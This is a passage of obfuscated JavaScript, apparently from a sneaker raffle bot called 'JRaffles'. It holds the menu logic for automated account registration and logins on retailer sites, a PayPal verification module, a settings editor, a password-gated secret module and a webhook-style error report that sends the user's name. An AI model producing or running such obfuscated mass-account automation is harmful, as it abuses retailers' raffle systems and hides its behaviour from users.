                                                var _0x5ae717 = await _0x10659e(), _0x2ac481 = await _0x746fa1();
                                                return await _0x3bf321('https://slamjam.nl/account/register', _0xee5303, _0x2ac481, _0x5ae717), _0x109452();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x5ae717 = await _0x10659e(), _0x2ac481 = await _0x746fa1();
                                                    return await _0x2c857c('', _0xee5303, _0x2ac481, _0x5ae717), _0x109452();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x1299c5[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                                                var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x5ae717 = await _0x10659e(), _0x10f851 = await _0x746fa1();
                                                    return await _0x4b799c('https://www.kickz.com/nl/login/', _0xee5303, _0x10f851, _0x5ae717), _0x109452();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x5ae717 = await _0x10659e(), _0x10f851 = await _0x746fa1();
                                                        return await _0x5d4098(_0xee5303, _0x10f851, _0x5ae717), _0x109452();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x1299c5[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x2f2d2a(_0x1299c5[taskModule]['modules']);
                                                    var _0xee5303 = _0x1299c5[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x5ae717 = await _0x10659e(), _0x5c0b4e = await _0x746fa1();
                                                        return await _0x1e7f2a(_0xee5303, _0x5c0b4e, _0x5ae717), _0x109452();
                                                    }
                                                } else {
                                                    if (_0x1299c5[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x30926a(0x3e8), _0x109452();
                                                    else {
                                                        if (_0x1299c5[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x3f33f8 = _0x1299c5[taskModule]['name'], _0x5ae717 = await _0x10659e();
                                                            const _0x24330e = await _0x2f83b0();
                                                            var _0x219ad2 = _0x24330e['split'](';');
                                                            await _0x14b993(_0x219ad2, _0x3f33f8, _0x5ae717);
                                                        } else {
                                                            if (_0x1299c5[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x42de7d = 0x0;
                                                                for (const _0x12615a in _0x1ca3b9) {
                                                                    console['log']('(' + _0x42de7d + ')\x20' + _0x12615a + '\x20:\x20' + _0x1ca3b9[_0x12615a]), _0x42de7d++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x42de7d + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x482935 = await _0x37130c();
                                                                if (_0x482935 == _0x42de7d)
                                                                    return _0x109452();
                                                                console['clear'];
                                                                var _0x499f48 = 0x0;
                                                                for (var _0x2525bb in _0x1ca3b9) {
                                                                    if (_0x482935 == _0x499f48) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x2525bb + '\x20:'), _0x1ca3b9[_0x2525bb] = await _0x3cabff(), _0x1c44db['writeFileSync']('../settings.json', JSON['stringify'](_0x1ca3b9));
                                                                        break;
                                                                    } else
                                                                        _0x499f48++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x30926a(0xbb8), _0x109452();
                                                            } else {
                                                                if (_0x1299c5[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x3a17b7(), _0x109452();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x1299c5[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x895740 = await _0x1cf80e();
                                                                        _0x895740 == 'ModuleVoorDeBoys' ? (await _0x289e17(), await _0x3f3940(), await afewFunction(_0x31c585[_0x13c408], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x30926a(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0x109452();
        } catch (_0x709743) {
            return console['log'](_0x709743), await _0x30926a(0x3a98);
        }
}
;
_0x359416('JRaffles\x20' + _0x531a7c), _0x3a17b7();
try {
    _0x428c96();
} catch (_0x50ccc3) {
    var _0x4739e9 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x3566aa
            },
            {
                'name': 'Version',
                'value': '' + _0x531a7c
            },
            {
                'name': 'Error',
                'value': '' + _0x50ccc3
            }
        ]
    }];
    const _0x42a6b3 = { 'embeds': _0x4739e9 };
    _0x5778ae(_0xc30fae, _0x42a6b3);
}